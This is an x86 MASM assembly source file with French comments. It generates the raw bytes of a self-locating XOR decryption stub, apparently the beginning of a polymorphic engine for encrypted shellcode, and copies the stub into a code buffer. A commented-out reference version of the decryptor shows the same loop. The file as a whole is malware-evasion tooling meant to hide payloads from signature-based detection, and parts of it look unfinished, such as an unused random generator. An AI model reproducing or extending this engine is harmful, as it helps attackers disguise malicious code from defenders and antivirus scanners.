;polymorpher.asm
; generates decrypt

.586
.model	flat, stdcall
option	casemap :none

	include \masm32\include\windows.inc
	include \masm32\include\user32.inc
	include \masm32\include\kernel32.inc
	include \masm32\include\msvcrt.inc


	includelib \masm32\lib\user32.lib
	includelib \masm32\lib\kernel32.lib
	includelib \masm32\lib\msvcrt.lib


.data

	RNDMAX	equ	4

	_EAX	equ	0
	_ECX	equ	1
	_EDX	equ	2
	_EBX	equ	3


patterndeci	db "val => %i  ", 13,10,0
patternchar	db "%c  ",0
patternptr	db "val => %p",13,10,0
patternshort	db "val => %hd",13,10,0
patternret	db "buffer => %p len => %i",13,10,0

.code

start:
	; push	RNDMAX
	; call		get_random
	; invoke	crt_printf, offset patterndeci, eax
	; invoke	ExitProcess, 69
	jmp	polymorpher

codebuffer:
byte		0;00401000 > $ E8 call -
dword		0; 0000000     decrypt.00401005 -
byte		0;00401005   $ 5B       POP EBX -
word		0;00401006   . 8BC3           MOV EAX,EBX -
byte		0;00401008   . 2D 05000000    SUB EAX -
dword		0;05 -
word		0;0040100D   . 83E8 02        SUB EAX, -
byte		0;2 -
word		0;00401010   . 8BC8           MOV ECX,EAX -
word		0;00401012   . 83E9 04        SUB ECX -
byte		0;,4 -
byte		0;00401015   . BA 2A000000    MOV EDX, -
dword		0;2A -
word		0;0040101A   . 03D3           ADD EDX,EBX -
word		0;0040101C   . 8B09           MOV ECX,DWORD PTR DS:[ECX] -
word		0;0040101E   > 8A1A           MOV BL,BYTE PTR DS:[EDX] -
byte		0;00401020   . 50             PUSH EAX  -
word		0;00401021   . 8B00           MOV EAX,DWORD PTR DS:[EAX] -
word		0;00401023   . 32D8           XOR BL,AL -
byte		0;00401025   . 58             POP EAX -
word		0;00401026   . 881A           MOV BYTE PTR DS:[EDX],BL -
byte		0;00401028   . 42             INC EDX
byte		0;00401029   . 49             DEC ECX
word		0;0040102A   . 83F9 00        CMP ECX,
byte		0;0
word		0;0040102D   .75 EF          JNZ SHORT decrypt.0040101E


;ret ecx => len
;ret eax => buffer
;polymorpher()
polymorpher:
	push	ecx
	push	edx
	push	512
	;call	dword ptr [ebp - 308]	;malloc()
	call	crt_malloc
	add	esp, 4

	pop	edx
	pop	ecx

	or	eax, eax
	jz	malloc_error

	push	eax				; sauvegarde du pointeur debut de buffer
	mov	edi, eax

	; push	eax
	; push	eax
	; push	dword ptr [ebp - 508]
	; call	dword ptr [ebp - 280] 		;invoke printf
	; add esp, 12
	; push	22d
	; call	dword ptr [ebp - 236]

	;call	un_delta => E8 0000 0000

	xor	eax, eax
	or	al, 0E8h
	stosb

	xor	eax, eax
	stosd

	;pop	ebx
	xor	eax, eax
	or	al,05Bh
	stosb

	; mov	eax, ebx 8BC3   ax:[al/8B || ah/C3]
	xor	eax, eax
	or	al, 8Bh			;mov
	or	ah, 0C3h		;eax, ebx
	stosw

	;sub eax,
	xor	eax, eax
	or	al, 02Dh
	stosb
	;; imm32 5
	xor	eax,eax
	or	eax, 5d
	stosd

	;; sub eax, 83E8
	xor	eax, eax
	or	al, 83h
	or 	ah, 0E8h
	stosw

	;; 2 imm8
	xor	eax,eax
	or	al,02h
	stosb

	;; mov	ecx,eax
	xor	eax, eax
	or	al,8Bh
	or	ah, 0C8h
	stosw

	;; sub ecx 83E9
	xor	eax, eax
	or	al,83h
	or	ah, 0E9h
	stosw

	;; imm8 04
	xor	eax,eax
	or	al, 04d
	stosb

	;; mov	edx,
	xor	eax,eax
	or	al, 0BAh
	stosb
	;; imm32 2A
	xor	eax,eax
	or	al,2Ah
	stosd

	;; add edx, ebx 03D3
	xor	eax,eax
	or	al, 03h
	or	ah, 0D3h
	stosw

	;; mov ecx, [ecx] 8B09
	xor	eax,eax
	or	al,8bh
	or	ah,09h
	stosw

	;; mov	bl, [edx] 8A1A
	xor	eax,eax
	or	al,8Ah
	or	ah,1Ah
	stosw

	;; push	eax 50
	xor	eax,eax
	or	al,50h
	stosb
	;; mov eax,[eax] 8b00
	xor	eax,eax
	or	al,8bh
	or	ah, 00h
	stosw

	;; xor	bl,al 32D8
	xor	eax,eax
	or	al, 32h
	or	ah, 0D8h
	stosw
	;; pop	eax 58
	xor	eax,eax
	or	al, 58h
	stosb

	;; mov	[edx], bl 881A
	xor	eax,eax
	or	al,88h
	or	ah,1Ah
	stosw

	;; inc edx 42 \o/
	xor	eax,eax
	or	al,42h
	stosb
	;; dec ecx 49
	xor	eax,eax
	or	al,49h
	stosb

	;; cmp ecx, imm8 83F9
	xor 	eax,eax
	or	al,83h
	or	ah,0F9h
	stosw

	;0
	xor	eax, eax
	or	al, 00h
	stosb

	;; jnz short un_crypting 75 Ef
	xor	eax,eax
	or	al,75h
	or	ah, 0EFh
	stosw

	;call	crt_memcpy			;memcpy(new_buffer(infile),old_buffer(malloced) ,old_decrypt_len)
	pop	eax				;ret le buffer
	mov	ecx, edi
	sub	ecx, eax			;ret len

	push	ecx
	push	eax
	invoke	crt_memcpy, codebuffer, eax, ecx
	invoke	crt_printf, offset patternret
_end:
	push	42
	call	ExitProcess

malloc_error:
	invoke ExitProcess, 1

;get_random(int max)
get_random:
	push	ebp
	mov	ebp, esp
	push	ecx
	push	edx

	call	random
	xor	edx,edx
	mov	ecx, [ebp + 8]
	div	ecx
	mov	eax,edx

	pop	edx
	pop	ecx
	leave
	ret	4

;random()
random:
	push	ebp
	mov	ebp, esp
	push	ebx
	push	esi
	push	edi

	sub	esp, 200
	lea	edi, [ebp - 100]
	push	edi
	GetSystemTime
	xor	eax,eax
	lea	edi, [ebp - 100]
	add	edi, 14
	mov	esi, [edi]
	mov	ax, si			;ms
	sub	edi, 2
	shl	eax, 16
	mov	esi, [edi]
	mov	ax, si			;secs

	pop	edi
	pop	esi
	pop	ebx
	leave
	ret

end start


; un_crypt:
	; call	un_delta
; un_delta:
	; pop	ebx
	; mov	eax, ebx
	; sub	eax, un_delta - un_crypt
	; sub	eax, 2				; eax == &key
	; mov	ecx, eax
	; sub	ecx, 4				; ecx == strlen(sh)

	; mov	edx, un_end - un_delta
	; add	edx, ebx			; edx == &sh
	; mov	ecx, [ecx]

; un_crypting:
	; mov	bl, [edx]			; edi pointe sur le carac courant
	; push	eax
	; mov	eax, [eax]
	; xor	bl, al				; on le xor avec la cle
	; pop	eax
	; mov	[edx], bl			; on ecrase le carac courant

	; inc	edx
	; dec	ecx
	; cmp 	ecx, 0
	; jne	un_crypting
; un_end: